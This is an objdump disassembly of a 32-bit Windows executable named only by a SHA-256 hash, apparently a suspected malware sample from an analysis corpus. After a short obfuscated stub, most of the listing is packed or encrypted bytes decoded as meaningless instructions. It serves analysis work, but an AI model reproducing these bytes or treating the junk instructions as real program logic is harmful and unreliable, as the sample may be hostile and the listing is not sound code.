
7cdc05335a554f105c30814380a217a3b9d77a2e43eff391b97933f99dd951d7.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	add    DWORD PTR ds:0x4282c7,edx
  40100c:	mov    eax,DWORD PTR [ebp-0x50]
  40100f:	cmp    DWORD PTR ds:0x42836f,0x0
  401016:	mov    DWORD PTR ds:0x42833f,0x2f64
  401020:	not    ecx
  401022:	jmp    0x401482
  401027:	mov    DWORD PTR ds:0x42828f,0x2f16
  401031:	not    ecx
  401033:	cmp    DWORD PTR ds:0x42836f,0x0
  40103a:	jne    0x401066
  401040:	push   0x2daf
  401045:	call   DWORD PTR ds:0x428dc4
  40104b:	mov    ecx,DWORD PTR ds:0x4283f7
  401051:	sub    DWORD PTR ds:0x4282ab,ecx
  401057:	movzx  ecx,WORD PTR ds:0x4282d7
  40105e:	and    DWORD PTR ds:0x428293,ecx
  401064:	add    ecx,ecx
  401066:	mov    ecx,DWORD PTR ds:0x42821f
  40106c:	xor    edx,edx
  40106e:	add    edx,DWORD PTR ds:0x428317
  401074:	sub    ecx,edx
  401076:	xor    ecx,DWORD PTR [ecx+edx*1]
  401079:	adc    DWORD PTR ds:0x4283cf,0x71ea
  401083:	mov    ecx,DWORD PTR ds:0x4282fb
  401089:	mov    edx,DWORD PTR ds:0x4283fb
  40108f:	sub    edx,ecx
  401091:	xor    ecx,DWORD PTR [ecx+edx*1]
  401094:	adc    DWORD PTR ds:0x42835f,ebx
  40109a:	and    DWORD PTR ds:0x4282a7,0x4c59
  4010a4:	jmp    0x401482
  4010a9:	jae    0x4010a7
  4010ab:	ins    DWORD PTR es:[edi],dx
  4010ac:	mov    cl,0x5b
  4010ae:	and    DWORD PTR [ebx],esi
  4010b0:	cmp    ebp,DWORD PTR [edx-0x5341034d]
  4010b6:	or     BYTE PTR [edx],al
  4010b8:	push   0x18
  4010ba:	sbb    BYTE PTR [eax],bl
  4010bc:	sbb    BYTE PTR [esi+0x2f181812],bl
  4010c2:	mov    al,ds:0x8ec028c5
  4010c7:	lock mov cl,0xf9
  4010ca:	cmp    dh,ah
  4010cc:	cs sbb bh,dl
  4010cf:	jno    0x401082
  4010d1:	adc    BYTE PTR [ebx],cl
  4010d3:	stc    
  4010d4:	pop    ss
  4010d5:	jno    0x401135
  4010d7:	sbb    eax,0x648fe8fa
  4010dc:	(bad)  
  4010de:	mov    esp,0xa611f941
  4010e3:	and    eax,0x732a514e
  4010e8:	inc    edx
  4010e9:	mov    ds:0x95d8e3bf,eax
  4010ee:	cld    
  4010ef:	clc    
  4010f0:	sub    eax,0xcd39b412
  4010f5:	dec    eax
  4010f6:	pop    esp
  4010f7:	push   edx
  4010f8:	and    al,0x9
  4010fa:	fcomp  QWORD PTR [ebx-0x3e921a10]
  401100:	dec    esi
  401101:	inc    edx
  401102:	jp     0x4010dc
  401104:	clc    
  401105:	xchg   esp,eax
  401106:	xor    BYTE PTR [ebx],0x95
  401109:	jle    0x40110b
  40110b:	call   DWORD PTR [esi+0x63640b89]
  401111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401112:	cmc    
  401113:	sbb    ebp,DWORD PTR [eax-0x75146c60]
  401119:	adc    DWORD PTR [edx],ebx
  40111b:	int3   
  40111c:	sub    al,0x1e
  40111e:	mov    esp,0x65939c8d
  401123:	and    al,0xa3
  401125:	and    ecx,DWORD PTR [esi+0x4f]
  401128:	mov    ebx,0xa4679e25
  40112d:	cmp    edx,DWORD PTR [ebx]
  40112f:	inc    esp
  401130:	add    BYTE PTR [edi+0x1810f1c4],dh
  401136:	jbe    0x401158
  401138:	test   bl,ch
  40113a:	out    0xdb,eax
  40113c:	jmp    0x4010c5
  40113e:	dec    edi
  40113f:	or     ebp,edx
  401141:	xchg   esi,eax
  401142:	adc    bl,BYTE PTR [esi+esi*2+0x34]
  401146:	pop    ebx
  401147:	mov    dl,0xba
  401149:	call   0x36ce118
  40114e:	add    ebx,DWORD PTR [edx+0x6d]
  401151:	pop    ss
  401152:	loop   0x401188
  401154:	mov    edi,0x43c116ad
  401159:	inc    ecx
  40115a:	sub    al,0xb8
  40115c:	frstor [ebp-0x512d06d5]
  401162:	ret    0xcb62
  401165:	add    al,0x81
  401167:	pcmpgtw mm5,QWORD PTR [ebx+0x3721b584]
  40116e:	sub    BYTE PTR [esi+edi*8+0x13c871ce],0x21
  401176:	sub    eax,DWORD PTR [esi]
  401178:	addr16 push eax
  40117a:	repz sbb al,BYTE PTR [ecx-0x6]
  40117e:	lods   al,BYTE PTR ds:[esi]
  40117f:	fmul   DWORD PTR [ecx+0x5a]
  401182:	adc    al,0x93
  401184:	sub    DWORD PTR [ecx-0x366eef],esp
  40118a:	icebp  
  40118b:	lds    esi,FWORD PTR ds:0x32609a52
  401191:	jnp    0x4011c7
  401193:	inc    ecx
  401194:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401195:	pop    ecx
  401196:	mov    bh,0x97
  401198:	out    dx,eax
  401199:	leave  
  40119a:	arpl   WORD PTR [eax+eiz*2-0x2a],bx
  40119e:	adc    al,0xc7
  4011a0:	rol    DWORD PTR ds:0x421bd87b,cl
  4011a6:	mov    ch,0x4e
  4011a8:	sbb    DWORD PTR [edx],esp
  4011aa:	call   DWORD PTR [edi+ebx*8-0x6f]
  4011ae:	stos   DWORD PTR es:[edi],eax
  4011af:	mov    BYTE PTR [ebx],bl
  4011b1:	call   0xdfc603b8
  4011b6:	(bad)  [edi+ecx*8]
  4011b9:	test   DWORD PTR [ebp-0x6c],ebp
  4011bc:	fst    QWORD PTR cs:[ebx]
  4011bf:	in     eax,dx
  4011c0:	dec    eax
  4011c1:	push   cs
  4011c2:	pop    ecx
  4011c3:	rol    BYTE PTR [ebx-0x34],cl
  4011c6:	mov    cl,0x92
  4011c8:	adc    ecx,DWORD PTR [edi+0x698be223]
  4011ce:	inc    eax
  4011cf:	dec    ebp
  4011d0:	inc    esi
  4011d1:	pop    es
  4011d2:	fcomp  QWORD PTR [esi*8+0x38304309]
  4011d9:	pop    edi
  4011da:	sub    edi,DWORD PTR [edx-0x2c]
  4011dd:	xchg   BYTE PTR gs:[edx-0x443285c7],dl
  4011e4:	imul   ebx,DWORD PTR [eax-0x4479e6a3],0x25
  4011eb:	xor    eax,0x8ae13361
  4011f0:	es aas 
  4011f2:	ffreep st(1)
  4011f4:	pop    esi
  4011f5:	sar    BYTE PTR [edx],cl
  4011f7:	loopne 0x40117c
  4011f9:	jno    0x4011a5
  4011fb:	add    eax,0xebb899a7
  401200:	add    DWORD PTR [edx],0x8e8411e2
  401206:	sbb    eax,0xd859e292
  40120b:	out    0x5d,eax
  40120d:	push   ebx
  40120e:	fdiv   st,st(3)
  401210:	mov    edi,0x4a5ed9e8
  401215:	inc    BYTE PTR [edx]
  401217:	mov    bl,0xf3
  401219:	rcl    dl,0xaf
  40121c:	push   0x50dfdc3e
  401221:	cmp    al,0x1a
  401223:	aad    0xb
  401225:	push   cs
  401226:	and    al,0x72
  401228:	mov    ds:0x525a4686,al
  40122d:	sbb    al,0x42
  40122f:	sahf   
  401230:	cmp    ah,cl
  401232:	mov    al,ds:0xa8fab38f
  401237:	sbb    DWORD PTR [ebx],0x3d
  40123a:	inc    edi
  40123b:	jecxz  0x4012bb
  40123d:	nop
  40123e:	sub    DWORD PTR [esi+0x46],edi
  401241:	int3   
  401242:	inc    edi
  401243:	(bad)  
  401244:	or     eax,0x1e766498
  401249:	dec    esi
  40124a:	rol    BYTE PTR [ebx],1
  40124c:	pop    esi
  40124d:	fstp   TBYTE PTR [ebp-0x53cf8a6d]
  401253:	sbb    al,0xc7
  401255:	cmp    bl,bh
  401257:	jbe    0x401214
  401259:	ins    BYTE PTR es:[edi],dx
  40125a:	scas   eax,DWORD PTR es:[edi]
  40125b:	(bad)  
  40125c:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40125e:	inc    edi
  40125f:	popa   
  401260:	nop
  401261:	mov    ebp,0xe2c52073
  401266:	dec    edi
  401267:	into   
  401268:	xor    BYTE PTR [ecx],ah
  40126a:	jo     0x401251
  40126c:	mov    bl,0x2c
  40126e:	js     0x40128a
  401270:	ss xchg ebp,eax
  401272:	mov    eax,0x752fa7a4
  401277:	push   ebp
  401278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401279:	push   ss
  40127a:	(bad)  
  40127b:	and    edi,DWORD PTR [ecx+0x5f26708a]
  401281:	sbb    BYTE PTR [edi],dl
  401283:	test   DWORD PTR [edi+edi*8+0x72],ecx
  401287:	jl     0x401257
  401289:	xchg   esi,eax
  40128a:	sub    dl,BYTE PTR [esi+ecx*2]
  40128d:	loope  0x4012e1
  40128f:	pop    edx
  401290:	pop    eax
  401291:	repz addr16 out dx,al
  401294:	ret    
  401295:	inc    eax
  401296:	sar    DWORD PTR [eax-0x2a],1
  401299:	repnz xchg edx,eax
  40129b:	adc    eax,DWORD PTR [ecx+0x38]
  40129e:	sub    edx,DWORD PTR [esi-0x775bfe3a]
  4012a4:	outs   dx,DWORD PTR ds:[esi]
  4012a5:	sti    
  4012a6:	sahf   
  4012a7:	push   cs
  4012a8:	(bad)  
  4012a9:	sbb    ebx,DWORD PTR [esi+0xe822f31]
  4012af:	dec    ebp
  4012b0:	(bad)  
  4012b1:	and    BYTE PTR [edx],ah
  4012b3:	aad    0xb6
  4012b5:	loop   0x4012e9
  4012b7:	pop    es
  4012b8:	out    dx,al
  4012b9:	sahf   
  4012ba:	jp     0x4012a0
  4012bc:	push   ebp
  4012bd:	jae    0x401301
  4012bf:	fwait
  4012c0:	and    ebp,eax
  4012c2:	rcr    BYTE PTR [esi],cl
  4012c4:	mov    bl,0x9d
  4012c6:	mov    eax,ds:0x625b2cb7
  4012cb:	(bad)  
  4012cc:	cmp    DWORD PTR ds:0x7afec220,ecx
  4012d2:	stos   DWORD PTR es:[edi],eax
  4012d3:	inc    eax
  4012d4:	fcomp  st(0)
  4012d6:	adc    al,0x7d
  4012d8:	fdivr  DWORD PTR [esi-0x6fec7778]
  4012de:	adc    edx,DWORD PTR [eax+ebx*8]
  4012e1:	retf   
  4012e2:	lock or DWORD PTR [eax],ebx
  4012e5:	mov    ch,0xdd
  4012e7:	mov    edi,0x2ecde883
  4012ec:	cld    
  4012ed:	xchg   ebx,eax
  4012ee:	xchg   ecx,eax
  4012ef:	int    0x86
  4012f1:	loopne 0x40135e
  4012f3:	sbb    al,0xc3
  4012f5:	inc    esp
  4012f6:	outs   dx,BYTE PTR ds:[esi]
  4012f7:	(bad)  
  4012f8:	or     al,0x5f
  4012fa:	mov    bh,0x5c
  4012fc:	call   0x784f:0x6799bb36
  401303:	jecxz  0x4012f7
  401305:	leave  
  401306:	mov    dl,0xe8
  401308:	add    BYTE PTR ds:0xf115edc3,bh
  40130e:	test   BYTE PTR [ecx+0x4a6bc3f],bl
  401314:	push   edx
  401315:	push   ebx
  401316:	loopne 0x40136c
  401318:	cmp    eax,0x25046676
  40131d:	cmc    
  40131e:	adc    al,0xe4
  401320:	xchg   ebx,eax
  401321:	mov    ch,0xaf
  401323:	rol    DWORD PTR [eax-0x1bf336e0],cl
  401329:	pop    eax
  40132a:	lock ins BYTE PTR es:[edi],dx
  40132c:	sub    eax,0x712ee6cf
  401331:	xor    cl,BYTE PTR [esp+esi*8-0x48]
  401335:	out    dx,al
  401336:	mov    esp,0x58dbb4ab
  40133b:	jge    0x4013a0
  40133d:	pminub mm3,QWORD PTR [ecx]
  401340:	imul   esp,DWORD PTR [esi],0xc9416807
  401346:	in     eax,0x72
  401348:	jns    0x40130b
  40134a:	lods   eax,DWORD PTR ds:[esi]
  40134b:	sbb    bh,BYTE PTR [ecx]
  40134d:	sti    
  40134e:	neg    BYTE PTR [ebx+ecx*4]
  401351:	mov    edi,0x32daca33
  401356:	loopne 0x40131b
  401358:	or     al,0x80
  40135a:	mov    edx,ds
  40135c:	push   eax
  40135d:	dec    ebx
  40135e:	xchg   esi,eax
  40135f:	enter  0x30ea,0xf0
  401363:	stos   DWORD PTR es:[edi],eax
  401364:	movlps QWORD PTR [edx+0x2c],xmm0
  401368:	ins    BYTE PTR es:[edi],dx
  401369:	pop    ss
  40136a:	sub    esp,DWORD PTR [ebp-0x50]
  40136d:	or     dh,BYTE PTR [eax+0x28e1f6b2]
  401373:	sar    dl,0x52
  401376:	jo     0x40137f
  401378:	test   al,0x84
  40137a:	loop   0x4013b6
  40137c:	mov    WORD PTR [edx+edi*4+0x7e],gs
  401380:	ret    
  401381:	lock int3 
  401383:	fadd   DWORD PTR [ebp-0x53eba2d6]
  40138a:	loope  0x4013e6
  40138c:	mov    ds:0x53b98d1,eax
  401391:	lock (bad) 
  401393:	clc    
  401394:	jns    0x401380
  401396:	retf   
  401397:	jl     0x401361
  401399:	cdq    
  40139a:	adc    al,0xaa
  40139c:	push   ecx
  40139d:	enter  0xeb1e,0xa4
  4013a1:	xor    DWORD PTR [eax-0x34f4edc9],esp
  4013a7:	add    bl,bh
  4013a9:	retf   
  4013aa:	int    0xc2
  4013ac:	(bad)  
  4013ad:	idiv   DWORD PTR [edx+0x22e60d10]
  4013b3:	cld    
  4013b4:	addr16 inc edi
  4013b6:	loope  0x401431
  4013b8:	cmp    BYTE PTR [ebx+0x7abb9852],0x3c
  4013bf:	sub    al,BYTE PTR [esp+eax*2]
  4013c2:	hlt    
  4013c3:	push   0x62ddbcd1
  4013c8:	mov    dl,0x31
  4013ca:	xchg   esp,eax
  4013cb:	and    bl,ah
  4013cd:	or     ah,BYTE PTR [esi-0x11]
  4013d0:	pop    ecx
  4013d1:	or     al,0xb6
  4013d3:	inc    esi
  4013d4:	inc    esp
  4013d5:	push   eax
  4013d6:	jbe    0x4013d0
  4013d8:	inc    edi
  4013d9:	sti    
  4013da:	mov    ebp,0x9188bcf8
  4013df:	into   
  4013e0:	xlat   BYTE PTR ds:[ebx]
  4013e1:	inc    DWORD PTR [esi+esi*8+0x4f730f4d]
  4013e8:	or     ch,al
  4013ea:	push   eax
  4013eb:	cmp    BYTE PTR [eax-0x59],bh
  4013ee:	adc    eax,0xf4f8cbb0
  4013f3:	cmp    eax,0xc2ba4985
  4013f8:	retf   0x8ebe
  4013fb:	mov    bl,0xf9
  4013fd:	aad    0x5e
  4013ff:	and    eax,0xa48e0569
  401404:	jmp    0xf0d9:0xfdb5ee36
  40140b:	adc    DWORD PTR [ebp+0x4d],ebp
  40140e:	adc    eax,0x111e3c45
  401413:	test   DWORD PTR [edi+0x3ae3ccf7],edi
  401419:	lds    esi,FWORD PTR [esi]
  40141b:	mov    esp,0x4707e480
  401420:	xlat   BYTE PTR ds:[ebx]
  401421:	dec    ebp
  401422:	lock (bad) 
  401424:	hlt    
  401425:	mov    WORD PTR [esp+ebp*4+0x4a],gs
  401429:	nop
  40142a:	adc    bh,BYTE PTR [esi-0xe]
  40142d:	mov    fs,WORD PTR [edx]
  40142f:	out    0x13,al
  401431:	ret    0x7fb5
  401434:	sbb    edi,DWORD PTR [ecx+edi*1-0x31]
  401438:	and    edx,DWORD PTR [ebx+eax*4-0x66]
  40143c:	cdq    
  40143d:	cld    
  40143e:	push   esi
  401440:	push   ebp
  401441:	mov    ds:0x906d56ce,eax
  401446:	call   0x3b89783a
  40144b:	int    0x52
  40144d:	add    al,0x98
  40144f:	dec    esi
  401450:	into   
  401451:	cmp    dl,dl
  401453:	mov    bh,0x6e
  401455:	sbb    BYTE PTR ds:0xd198b674,dh
  40145b:	popa   
  40145c:	inc    esi
  40145d:	and    edx,DWORD PTR [eax+edx*4]
  401460:	mov    WORD PTR ds:0x5aed46b0,es
  401466:	daa    
  401467:	shr    DWORD PTR cs:[eax],0x77
  40146b:	push   edi
  40146c:	jno    0x40146e
  40146e:	mov    eax,0x287f210c
  401473:	jnp    0x4013fe
  401475:	pop    esp
  401476:	adc    BYTE PTR [ebp+ebx*4-0x1c],0x76
  40147b:	push   0x97d16e0
  401480:	into   
  401481:	iret   
  401482:	mov    ecx,DWORD PTR [ebp-0x4c]
  401485:	mov    edx,DWORD PTR [ebp-0x50]
  401488:	sub    eax,edx
  40148a:	mov    DWORD PTR ds:0x4283bf,edx
  401490:	push   edi
  401491:	mov    edi,DWORD PTR [ebp-0x4c]
  401494:	mov    DWORD PTR [ebp-0x50],eax
  401497:	mov    edx,0x488c
  40149c:	sbb    ecx,edi
  40149e:	mov    DWORD PTR [ebp-0x4c],ecx
  4014a1:	mov    edx,DWORD PTR ds:0x4282fb
  4014a7:	mov    edx,DWORD PTR [edx]
  4014a9:	and    DWORD PTR ds:0x42834b,edx
  4014af:	or     DWORD PTR [ebp-0x50],0xca78cc41
  4014b6:	or     DWORD PTR [ebp-0x4c],0x9c1b89e8
  4014bd:	and    DWORD PTR ds:0x42827b,0x6649
  4014c7:	mov    eax,DWORD PTR [ebp-0x58]
  4014ca:	add    ecx,0xa44
  4014d0:	mov    ecx,DWORD PTR [ebp-0x54]
  4014d3:	cmp    DWORD PTR ds:0x4282a3,0x0
  4014da:	mov    DWORD PTR ds:0x42827f,ecx
  4014e0:	mov    DWORD PTR ds:0x428343,0x3ae4
  4014ea:	mov    edi,0x1ebc
  4014ef:	mov    edx,0x7e4f
  4014f4:	jmp    0x40154f
  4014f9:	not    DWORD PTR ds:0x4281bb
  4014ff:	mov    edx,0x300f
  401504:	cmp    DWORD PTR ds:0x4282a3,0x0
  40150b:	jae    0x401543
  401511:	push   0x1b93
  401516:	call   DWORD PTR ds:0x428dc8
  40151c:	mov    edx,DWORD PTR ds:0x42831b
  401522:	xor    edi,edi
  401524:	or     edi,DWORD PTR ds:0x428393
  40152a:	sub    edx,edi
  40152c:	or     edx,DWORD PTR [edx+edi*1]
  40152f:	xor    edx,edx
  401531:	add    edx,DWORD PTR ds:0x4281ef
  401537:	mov    edi,DWORD PTR ds:0x428397
  40153d:	sub    edi,edx
  40153f:	imul   edx,DWORD PTR [edx+edi*1]
  401543:	and    edi,0x359a
  401549:	or     edi,0x3261
  40154f:	mov    edx,DWORD PTR [ebp-0x58]
  401552:	mov    edi,DWORD PTR [ebp-0x54]
  401555:	jmp    0x401933
  40155a:	outs   dx,DWORD PTR ds:[esi]
  40155b:	add    eax,0x3a5a4a0b
  401560:	das    
  401561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401562:	out    dx,al
  401563:	sbb    ebx,DWORD PTR [ebp-0xdd1ea90]
  401569:	push   0xffffff9e
  40156b:	adc    bl,BYTE PTR [eax]
  40156d:	sbb    BYTE PTR [esi-0x31e7e7ee],bl
  401573:	mov    DWORD PTR [edi+0x51248928],eax
  401579:	push   ds
  40157a:	sub    bl,BYTE PTR [edi]
  40157c:	jbe    0x4015c3
  40157e:	mov    bl,0x18
  401580:	mov    bl,0xcc
  401582:	jae    0x4015b5
  401584:	inc    eax
  401585:	or     ebp,edi
  401587:	popf   
  401588:	adc    al,BYTE PTR [edx+0x74]
  40158b:	xlat   BYTE PTR ds:[ebx]
  40158c:	push   es
  40158d:	daa    
  40158e:	loope  0x4015d6
  401590:	xlat   BYTE PTR ds:[ebx]
  401591:	jbe    0x401535
  401593:	jl     0x4015b8
  401595:	mov    dl,0xe5
  401597:	test   bl,dl
  401599:	mov    WORD PTR [ebx-0x26],?
  40159c:	adc    edx,DWORD PTR [edi-0x4f3a3396]
  4015a2:	push   0x2636413b
  4015a7:	add    al,0x20
  4015a9:	call   0x3845:0x2ce4d0ac
  4015b0:	xadd   DWORD PTR [edx-0x2f6c13ae],ebp
  4015b7:	in     eax,0x97
  4015b9:	and    dh,BYTE PTR [ebp+esi*8+0x7f]
  4015bd:	jmp    0x5b621585
  4015c2:	push   ecx
  4015c3:	xchg   edx,eax
  4015c4:	mov    ds,WORD PTR [edx-0x4c]
  4015c7:	gs into 
  4015c9:	ja     0x401578
  4015cb:	jg     0x4015bf
  4015cd:	ins    DWORD PTR es:[edi],dx
  4015ce:	push   0xffffff95
  4015d0:	or     al,0x2b
  4015d2:	imul   ebp,eax,0x4b
  4015d5:	sti    
  4015d6:	push   ds
  4015d7:	enter  0x47a3,0xf3
  4015db:	push   cs
  4015dc:	xchg   esp,eax
  4015dd:	in     al,0x35
  4015df:	adc    esp,edi
  4015e1:	in     eax,dx
  4015e2:	pop    eax
  4015e4:	sub    al,0x30
  4015e6:	dec    ebp
  4015e7:	and    al,0xc4
  4015e9:	sbb    DWORD PTR [edi+0x1948b9d9],esi
  4015ef:	stos   DWORD PTR es:[edi],eax
  4015f0:	push   cs
  4015f1:	jle    0x401651
  4015f3:	mov    ?,WORD PTR [ecx+0x3d768c69]
  4015f9:	mul    BYTE PTR [ecx-0x28]
  4015fc:	jge    0x401616
  4015fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015ff:	stos   DWORD PTR es:[edi],eax
  401600:	dec    DWORD PTR [edi+0x42]
  401603:	std    
  401604:	aas    
  401605:	push   es
  401606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401607:	push   cs
  401608:	faddp  st(7),st
  40160a:	fs in  eax,0x3c
  40160d:	mov    al,0x38
  40160f:	mov    al,0x1b
  401611:	push   edi
  401612:	dec    esi
  401613:	ins    BYTE PTR es:[edi],dx
  401614:	pop    esi
  401615:	sbb    BYTE PTR [ebx-0x3c70913],dl
  40161b:	fnstcw WORD PTR [edi+0x19]
  40161e:	fmul   QWORD PTR ds:0x95b1bd08
  401624:	outs   dx,DWORD PTR ds:[esi]
  401625:	xchg   edx,eax
  401626:	call   DWORD PTR [ecx-0x176740cd]
  40162c:	ret    
  40162d:	jo     0x4015dc
  40162f:	xlat   BYTE PTR ds:[ebx]
  401630:	and    DWORD PTR [edx],ebx
  401632:	add    al,0xcd
  401634:	sti    
  401635:	dec    edi
  401636:	lahf   
  401637:	add    cl,0x9b
  40163a:	xor    BYTE PTR [ecx-0x53808ee3],bl
  401640:	cmp    al,0x3a
  401642:	xor    DWORD PTR [esi+0x7f],edi
  401645:	lahf   
  401646:	xor    BYTE PTR [ebx+edi*8-0x28cd5135],cl
  40164d:	inc    edx
  40164e:	jo     0x401641
  401650:	hlt    
  401651:	or     eax,0xdd11afec
  401656:	ss (bad) 
  401658:	repnz mov ecx,0x6ecd1277
  40165e:	sahf   
  40165f:	xchg   ebp,eax
  401660:	dec    edx
  401661:	mov    eax,ds:0xa4cc9fcc
  401666:	xchg   esp,eax
  401667:	mov    esi,0x933c317e
  40166c:	inc    esi
  40166d:	inc    ecx
  40166e:	hlt    
  40166f:	xor    esi,DWORD PTR [edx+0x36]
  401672:	call   0x6aae:0x648f8be4
  401679:	push   ss
  40167a:	mov    esi,0xb3d9da2e
  40167f:	imul   ebp,DWORD PTR [ebx],0x63
  401682:	sar    ah,cl
  401684:	(bad)  
  401685:	leave  
  401686:	sahf   
  401687:	adc    al,0xdb
  401689:	mov    ds:0x9a2910f6,eax
  40168e:	clc    
  40168f:	bnd jnp 0x401613
  401692:	mov    eax,ds:0xb2b65249
  401697:	pushf  
  401698:	fadd   DWORD PTR [eax]
  40169a:	hlt    
  40169b:	ds pop esp
  40169d:	es js  0x40169e
  4016a0:	and    BYTE PTR [edi],bh
  4016a2:	jno    0x40164b
  4016a4:	push   esp
  4016a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016a6:	push   ecx
  4016a7:	shl    al,0x77
  4016aa:	sub    DWORD PTR [eax],eax
  4016ac:	mov    ch,0x49
  4016ae:	jge    0x4016c3
  4016b0:	or     BYTE PTR [esi],dh
  4016b2:	pop    eax
  4016b3:	cmp    cl,al
  4016b5:	jg     0x4016db
  4016b7:	les    ecx,FWORD PTR [esi-0x43]
  4016ba:	es cdq 
  4016bc:	ja     0x40172b
  4016be:	pop    es
  4016bf:	retf   
  4016c0:	inc    ecx
  4016c1:	sbb    DWORD PTR [ecx+ecx*8+0x6a186732],eax
  4016c8:	xchg   esi,eax
  4016c9:	push   esi
  4016ca:	and    eax,0xbcc099d5
  4016cf:	mov    al,0x99
  4016d1:	outs   dx,BYTE PTR ds:[esi]
  4016d2:	adc    al,0xe
  4016d4:	or     al,BYTE PTR [ebx]
  4016d6:	cdq    
  4016d7:	mul    DWORD PTR [ebx+0x75]
  4016da:	std    
  4016db:	in     eax,0xc1
  4016dd:	dec    edx
  4016de:	inc    ecx
  4016e0:	(bad)  
  4016e1:	popf   
  4016e2:	sub    cl,bl
  4016e4:	fs in  eax,0xb7
  4016e7:	push   ds
  4016e8:	jbe    0x40171a
  4016ea:	fs mov ah,0xdb
  4016ed:	and    bh,BYTE PTR [ecx]
  4016ef:	add    eax,0x4f730cd5
  4016f4:	(bad)  
  4016f5:	xor    BYTE PTR [eax-0x532d3639],al
  4016fb:	(bad)  
  4016fc:	cwde   
  4016fd:	sahf   
  4016fe:	add    BYTE PTR [ecx+0x77],0x58
  401702:	mov    bh,BYTE PTR [edx+0x2d5d190]
  401708:	add    al,BYTE PTR [ebp-0x50f7e281]
  40170e:	push   0xffffffb6
  401710:	mov    al,0xb7
  401712:	and    al,0xa8
  401714:	ja     0x40177d
  401716:	fpatan 
  401718:	inc    ebx
  401719:	jg     0x4016d3
  40171b:	mov    edx,DWORD PTR [ecx+eax*1]
  40171e:	cwde   
  40171f:	push   0xc1e6927d
  401724:	pop    eax
  401725:	mov    esp,0xb79320c0
  40172a:	or     DWORD PTR es:[esi+eiz*2],edx
  40172e:	cmp    eax,0x72ff0421
  401733:	push   esp
  401734:	dec    ebx
  401735:	pop    ds
  401736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401737:	retf   0x8964
  40173a:	fwait
  40173b:	mov    esi,0x1422bf42
  401740:	pushf  
  401741:	inc    esp
  401742:	xchg   ecx,edi
  401744:	loop   0x401774
  401746:	(bad)  
  401747:	mov    bl,0xd2
  401749:	or     ebx,DWORD PTR [eax+0x30c8f2bb]
  40174f:	adc    eax,edi
  401751:	test   eax,0x5cd11d01
  401756:	dec    esi
  401757:	push   es
  401758:	test   BYTE PTR [ecx-0x21],dl
  40175b:	stc    
  40175c:	retf   
  40175d:	in     al,0x8
  40175f:	imul   edi,ebp,0x1c0a8c6
  401765:	pop    ebx
  401766:	mov    eax,0x247c39ad
  40176b:	es push ebx
  40176d:	sub    edx,DWORD PTR [eax+0x77]
  401770:	or     eax,DWORD PTR ds:0xfd98b7ae
  401776:	inc    esp
  401777:	in     al,0x79
  401779:	and    BYTE PTR [edx+0x1e],bh
  40177c:	jecxz  0x401799
  40177e:	cwde   
  40177f:	push   esi
  401780:	jb     0x40174d
  401782:	add    eax,0x3fe2b5a7
  401787:	sti    
  401788:	inc    ecx
  401789:	adc    al,0x68
  40178b:	mov    bl,0xe0
  40178d:	gs jge 0x40171a
  401790:	mov    ch,dl
  401792:	shl    bh,cl
  401794:	enter  0xfdf6,0x95
  401798:	shl    al,1
  40179a:	push   ds
  40179b:	mov    edx,0x6efe9768
  4017a0:	imul   eax,ebx,0x303d4036
  4017a6:	push   eax
  4017a7:	and    BYTE PTR [ecx+0x60bf410d],ah
  4017ad:	pop    esi
  4017ae:	rcr    DWORD PTR [ecx+0x59a02891],1
  4017b4:	(bad)  
  4017b5:	aam    0x96
  4017b7:	lock cs test eax,0x79cfe45b
  4017be:	mov    ecx,0xd95dec02
  4017c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017c4:	mov    ecx,0xc1d5ddc5
  4017c9:	jecxz  0x40175d
  4017cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017cc:	mov    ebp,0x214dd66d
  4017d1:	gs repnz (bad) 
  4017d4:	ror    BYTE PTR [edi],1
  4017d6:	fisttp QWORD PTR [ecx+0x8e52d7d]
  4017dc:	out    dx,eax
  4017dd:	out    0xd,al
  4017df:	pop    edi
  4017e0:	mov    cl,0xd7
  4017e2:	ins    BYTE PTR es:[edi],dx
  4017e3:	pop    edi
  4017e4:	mov    ebp,0x95ea048
  4017e9:	sub    BYTE PTR [esi-0x68dcbd56],ch
  4017ef:	(bad)  
  4017f0:	push   ebx
  4017f1:	cmp    eax,0x484f52ad
  4017f6:	pop    eax
  4017f7:	or     ecx,esi
  4017f9:	or     edi,DWORD PTR [eax+0x45]
  4017fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017fd:	add    BYTE PTR [ebp+0x568deaf5],0x8e
  401804:	push   edx
  401805:	mov    edx,0x20360069
  40180a:	mov    bl,0xcb
  40180c:	sbb    ebp,DWORD PTR [ebp+0x505dfd03]
  401812:	push   edx
  401813:	sahf   
  401814:	outs   dx,BYTE PTR ds:[esi]
  401815:	pop    ecx
  401816:	mov    cl,0x58
  401818:	pusha  
  401819:	ins    DWORD PTR es:[edi],dx
  40181a:	push   di
  40181c:	xchg   eax,edi
  40181e:	repz dec esp
  401820:	das    
  401821:	dec    eax
  401822:	cmp    edi,DWORD PTR [ecx+0x32]
  401825:	jne    0xb86d2873
  40182b:	aas    
  40182c:	daa    
  40182d:	inc    ebp
  40182e:	adc    BYTE PTR [ecx+0x2ae002d4],bh
  401834:	ins    DWORD PTR es:[edi],dx
  401835:	jp     0x4017fa
  401837:	lahf   
  401838:	push   ebx
  401839:	fwait
  40183a:	retf   0x3789
  40183d:	pusha  
  40183e:	mov    ch,0xe2
  401840:	daa    
  401841:	out    0x41,al
  401843:	pop    edi
  401844:	cmp    bl,dl
  401846:	adc    al,0x58
  401848:	xchg   ecx,eax
  401849:	add    BYTE PTR [eax],cl
  40184b:	in     al,0x1a
  40184d:	and    eax,0x3548f0e7
  401852:	sbb    DWORD PTR [edx+esi*2+0x7a],ebp
  401856:	enter  0x6439,0x3f
  40185a:	cmp    eax,0xfec752db
